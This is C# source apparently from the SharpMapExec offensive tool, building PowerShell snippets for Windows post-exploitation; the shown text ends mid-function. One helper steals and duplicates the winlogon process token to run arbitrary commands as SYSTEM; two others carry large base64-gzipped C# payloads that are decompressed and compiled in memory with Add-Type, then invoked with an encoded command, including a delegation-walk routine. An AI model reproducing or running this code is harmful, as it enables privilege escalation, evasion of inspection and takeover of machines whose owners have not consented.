using System;
using System.IO;
using System.Text;
using static SharpMapExec.Helpers.Misc;

namespace SharpMapExec.Helpers
{
    internal class PsFunction
    {
        public static string ImpersonateSystem(string command = "[System.Security.Principal.WindowsIdentity]::GetCurrent()")
        {
            string function = @"
$advapi32 = Add-Type -Name 'advapi32' -Namespace 'Win32' -PassThru	-MemberDefinition  @'
[DllImport(""advapi32.dll"", SetLastError = true)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool OpenProcessToken(
    IntPtr ProcessHandle,
    UInt32 DesiredAccess,
    out IntPtr TokenHandle);

[DllImport(""advapi32.dll"", SetLastError = true)]
public static extern bool DuplicateToken(
    IntPtr ExistingTokenHandle,
    int SECURITY_IMPERSONATION_LEVEL,
    ref IntPtr DuplicateTokenHandle);

[DllImport(""advapi32.dll"", SetLastError = true)]
public static extern bool ImpersonateLoggedOnUser(
    IntPtr hToken);

[DllImport(""kernel32.dll"")]
public static extern uint GetLastError();

[DllImport(""kernel32.dll"", SetLastError = true)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool CloseHandle(
    IntPtr hObject
);

[DllImport(""advapi32.dll"", SetLastError = true)]
public static extern bool RevertToSelf();

[DllImport(""advapi32.dll"", SetLastError = true)]
public static extern bool SetThreadToken(
    IntPtr Thread,
    IntPtr Token
);
'@
$isAdmin = (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if ($isAdmin) {{
    [intptr]$hToken    = [intptr]::Zero
    [IntPtr]$hDupToken = [intptr]::Zero
    [IntPtr]$handle    = (Get-Process 'winlogon').Handle
    $Success     = [Win32.advapi32]::OpenProcessToken($handle, 0x2, [ref]$hToken)
    if (!$success)
    {{
        return 'OpenProcessToken failed!'
    }}
    $success = [Win32.advapi32]::DuplicateToken($hToken,2, [ref]$hDupToken)
    if (!$success)
    {{
        return 'DuplicateToken failed!'
    }}
    $identity = [System.Security.Principal.WindowsIdentity]::New($hDupToken)
    $output = [System.Security.Principal.WindowsIdentity]::RunImpersonated($identity.AccessToken, [Func[object]]{{
        {0}
    }})
    $null = [Win32.advapi32]::CloseHandle($hToken)
    $null = [Win32.advapi32]::CloseHandle($hDupToken)
    return $Output
}}else{{
    write-output 'Not admin!'
    return $false
}}
";
            return String.Format(function, command);
        }

        public static string RunAsSystem(string command)
        {
            //string csFile = Lib.Wsman.Compress(File.ReadAllBytes(@"C:\git\ConsoleApp1\System.cs"));
            string csFile = "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";
            string function = @"
$b64 = '{0}'
$output = New-Object System.IO.MemoryStream
$Stream = New-Object IO.Compression.GZipStream([IO.MemoryStream][Convert]::FromBase64String($b64),[IO.Compression.CompressionMode]::Decompress)
$Stream.CopyTo($output)
$data = [System.Text.Encoding]::utf8.GetString($output.ToArray())
add-type -Language CSharp $data

[ConsoleApp2.Program]::System('{1}')
";
            return String.Format(function, csFile,  Convert.ToBase64String(Encoding.Unicode.GetBytes(command)));
        }

        public static string RunDelegationWalk(string command)
        {
            //string csFile = Lib.Wsman.Compress(File.ReadAllBytes(@"C:\git\ConsoleApp1\DelegWalk.cs"));
            string csFile = "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";
            string function = @"
$b64 = '{0}'
